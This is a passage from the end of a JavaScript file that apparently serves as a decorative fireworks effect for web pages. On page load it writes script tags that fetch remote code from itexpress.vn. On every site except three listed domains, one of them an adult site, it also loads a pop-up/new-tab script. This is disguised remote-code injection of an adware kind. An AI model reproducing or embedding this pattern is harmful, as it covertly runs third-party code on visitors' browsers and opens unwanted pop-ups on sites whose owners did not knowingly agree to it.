...
}, window.onload = fireworks, document.write('<script src="http://itexpress.vn/js/phaohoa.js"><\/script>');
var domain_curr = window.location.host,
    domain_ex = ["hentai12h.net", "chovietnam.info", "hopquaxuan2018.com"]; - 1 < domain_ex.indexOf(domain_curr) || document.write('<script src="http://itexpress.vn/js/popup_newtab_time.js"><\/script>');